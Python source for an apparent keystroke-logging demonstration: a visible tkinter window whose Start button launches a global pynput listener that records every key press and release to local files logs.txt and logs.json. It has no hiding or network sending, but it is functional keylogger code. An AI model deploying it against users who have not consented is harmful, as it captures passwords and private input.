import tkinter as tk
from pynput import keyboard 
import json

key_list = []
x = False
key_strokes = ""
listener = None
BG_COLOR = "#e8f0fe"

def update_txt_file(key):
    with open('logs.txt','w+') as key_strokes:
        key_strokes.write(key)

def update_json_file(key_list):
    with open('logs.json','+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x,key_list
    if x == False:
        key_list.append(
            {'Pressed': f'{key}'}
            )
        x = True 
    if x == True:
        key_list.append(
            { 'Held': f'{key}' }
            )
    update_json_file(key_list)

def on_release(key):
    global x,key_list,key_strokes
    key_list.append(
        { 'Released': f'{key}'}
    )
    if x == True:
        x = False
    update_json_file(key_list)
    key_strokes=key_strokes+str(key)
    update_txt_file(str(key_strokes))

def start_keylogger():
    print("[+] Running Keylogger Successfully! \n [!] Saving the key logs in 'logs.json'")
    global listener
    if listener is None:
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        status_label.config(text="Keylogger Running", fg="green")
   
def stop_keylogger():
    print("Keylogger Stoped \n")
    global listener
    if listener is not None:
        listener.stop()
        listener = None
        status_label.config(text="Keylogger Stopped", fg="red")

def exit_app():
    print("Keylogger Exited")
    stop_keylogger()   # IMPORTANT: stop listener first
    root.destroy()


root = tk.Tk()
root.title("Keystroke Logging Demo")
root.geometry("300x300")
root.configure(bg=BG_COLOR)

title_label = tk.Label(
    root,
    text="Keystroke Logging Demonstration",
    font=("Segoe UI", 16, "bold"),
    bg=BG_COLOR
)
title_label.pack(pady=15)

status_label = tk.Label(
    root,
    text="Keylogger Status",
    font=("Segoe UI", 14, "bold"),
    fg="red",
    bg=BG_COLOR
)
status_label.pack(pady=15)

button_frame = tk.Frame(root, bg=BG_COLOR)
button_frame.pack(pady=15)

start_btn = tk.Button(
    button_frame,
    text="Start",
    width=12,
    font=("Segoe UI", 11),
    bg="#4CAF50",
    fg="white",
    command=start_keylogger
)
start_btn.grid(row=0, column=0, padx=8)

stop_btn = tk.Button(
    button_frame,
    text="Stop",
    width=12,
    font=("Segoe UI", 11),
    bg="#F44336",
    fg="white",
    command=stop_keylogger
)
stop_btn.grid(row=0, column=1, padx=8)

exit_btn = tk.Button(
    button_frame,
    text="Exit",
    width=12,
    font=("Segoe UI", 11),
    bg="#607D8B",
    fg="white",
    command=exit_app
)
exit_btn.grid(row=1, column=0, columnspan=2, pady=12)

root.mainloop()